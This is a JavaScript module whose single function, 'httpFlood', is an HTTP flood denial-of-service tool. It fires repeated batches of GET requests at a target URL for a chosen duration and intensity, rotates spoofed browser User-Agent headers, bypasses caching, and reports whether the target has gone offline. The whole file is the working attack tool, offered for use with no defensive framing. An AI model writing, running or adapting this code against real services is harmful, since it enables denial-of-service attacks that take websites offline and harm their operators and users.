async function httpFlood(target, duration, intensity) {
  let packetsSent = 0;
  let targetStatus = 'Online';
  let mbps = 0;
  const startTime = Date.now();
  let errorOccurred = false;

  try {
    const url = new URL(target);
    const host = url.hostname;
    const path = url.pathname || '/';

    const protocol = url.protocol === 'https:' ? 'https' : 'http';
    const interval = Math.max(1, 100 / intensity);

    const userAgents = [
      'Noodles-Bot v3.0',
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
      'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
      'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0'
    ];

    while (Date.now() - startTime < duration * 1000) {
      const promises = [];
      for (let i = 0; i < intensity; i++) {
        const userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];

        const promise = fetch(target, {
            method: 'GET',
            headers: {
              'User-Agent': userAgent,
              'Cache-Control': 'no-cache',
              'Connection': 'keep-alive'
            }
          })
          .then(response => {
            packetsSent++;
            const contentLength = response.headers.get('content-length');
            if (contentLength) {
              mbps += parseInt(contentLength) / 1000000;
            }
          
            if (!response.ok) {
              targetStatus = 'Unresponsive';
            }
            return response.body;
          })
          .then(body => {
              if(body){
                  const reader = body.getReader();
                  return new ReadableStream({
                      start(controller) {
                          function push() {
                              reader.read().then(({ done, value }) => {
                                  if (done) {
                                      controller.close();
                                      return;
                                  }
                                  controller.enqueue(value);
                                  push();
                              });
                          }
                          push();
                      }
                  })
              }
          })
          .catch(error => {
            targetStatus = 'Offline';
            errorOccurred = true;
          });
        promises.push(promise);
      }
      await Promise.all(promises);
      await new Promise(resolve => setTimeout(resolve, interval));
      if(errorOccurred) break;
    }
  } catch (error) {
    console.error("Error in httpFlood:", error);
    targetStatus = 'Offline';
  }

  const elapsedTime = (Date.now() - startTime) / 1000;
  mbps = elapsedTime > 0 ? mbps / elapsedTime : 0;

    if(isNaN(mbps) || !isFinite(mbps)){
        mbps = 0;
    }
  return { packetsSent, targetStatus, mbps };
}

module.exports = { httpFlood };